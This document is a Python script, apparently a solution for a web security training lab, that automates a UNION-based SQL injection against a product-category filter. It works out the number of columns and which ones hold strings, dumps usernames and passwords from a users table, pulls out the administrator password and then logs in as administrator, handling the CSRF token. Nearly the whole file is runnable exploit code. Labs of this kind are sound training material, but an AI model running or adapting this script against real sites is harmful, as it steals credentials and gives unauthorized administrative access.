import requests 
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy={
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def numberof_column(url):
    path="/filter?category=Gifts"
    for i in range(1,50):
        payload = "'+order+by+{}+--".format(i)
        res = requests.get(url+path+payload,proxies=proxy,verify=False)
        if "Internal Server Error" in res.text:
            return i-1
    return False

def columnof_str_datatype(url,ncolumn):
    path="/filter?category=Gifts"
    for i in range(1,ncolumn+1):
        column_list = []
        p_list = ['null']*ncolumn
        p_list[i-1] = "'A'"    #any string
        payload = "'+union+select+"+"+,".join(p_list)+"+--"
        res = requests.get(url+path+payload,proxies=proxy,verify=False)
        if "Internal Server Error" not in res.text:
            column_list.append(i)
    print(",".join(str(column_list))+"nd column is of string datatype")
    return column_list

def admin_password(url,column_list,ncolumn):
    path="/filter?category=Gifts"
    for i in range(1,ncolumn+1):
        payload_list = ['null']*ncolumn
        if i in column_list:
                payload_list[i-1] = "username || '*' || password"
                payload = "' union select "+",".join(payload_list)+" from users"+" --"
                res = requests.get(url+path+payload,proxies=proxy,verify=False)
                if "administrator" in res.text:
                        print("Administrator found.......")
                        soup = BeautifulSoup(res.text,'html.parser')
                        password = soup.find(string=re.compile('.*administrator.*')).split('*')[1]
                        print("password= "+password)
    return password

def login(url,administrator_password):
     path="/login"
     s=requests.session()
     for_csrf = s.get(url+path,proxies=proxy,verify=False)
     soup = BeautifulSoup(for_csrf.text,'html.parser')
     csrf_token = soup.find("input")["value"]
     data={
          'csrf':csrf_token,
          'username':"administrator",
          'password':administrator_password
     }
     res = s.post(url+path,data=data,proxies=proxy,verify=False)
     if res.status_code == 200:
          print("## Successfully Logged In as Administrator ##")
          return True

        

if __name__=="__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[+] Usage : python3 {} <url>".format(sys.argv[0]))
        print("[+] Example : python3 {} <url>".format(sys.argv[0]))

    print("[+] Figuring Number of columns.......")
    ncolumn = numberof_column(url)
    print("Number Of Columns = ",ncolumn)
    column_list = columnof_str_datatype(url,ncolumn)
    administrator_password = admin_password(url,column_list,ncolumn)
    print("Attemptig to log in")
    check = login(url,administrator_password)
    if check:
         print("********* Lab Solved *************")